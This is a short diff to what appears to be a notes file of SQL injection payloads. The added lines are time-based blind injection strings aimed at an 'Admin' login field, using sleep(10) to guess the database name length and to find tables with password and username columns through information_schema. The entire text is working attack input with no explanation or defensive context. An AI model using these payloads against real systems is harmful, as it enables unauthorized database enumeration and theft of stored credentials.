@@ -32,6 +32,14 @@ iron man' AND IF(substr(@@version,1,1)='4'),SLEEP(10),0)#
 #Database Name:
 Admin 'AND (select sleep(10) from dual where database() like '%')#
 Admin 'AND (select sleep(10) from dual where database() like '%')#
-```
+
+
+Admin' AND (select sleep(10) from dual where database() like '-----')# #5
+Admin' AND (select sleep(10) from dual where database() like '------')#
+Admin' AND (select sleep(10) from dual where database() like '-------')#
+Admin' AND (select sleep(10) from dual where (select table_name from information_schema.columns where table_schema=database() and column_name like '%pass%' limit 0,1) like '%')#
+Admin' AND (select sleep(10) from dual where (select table_name from information_schema.columns where table_schema=database() and column_name like '%username%' limit 0,1) like '%')#
+Admin' AND (select sleep(10) from dual where (select table_name from information_schema.columns where table_schema=database() and column_name like '%pass%' limit 0,1) like '----')#
 
 ```
+
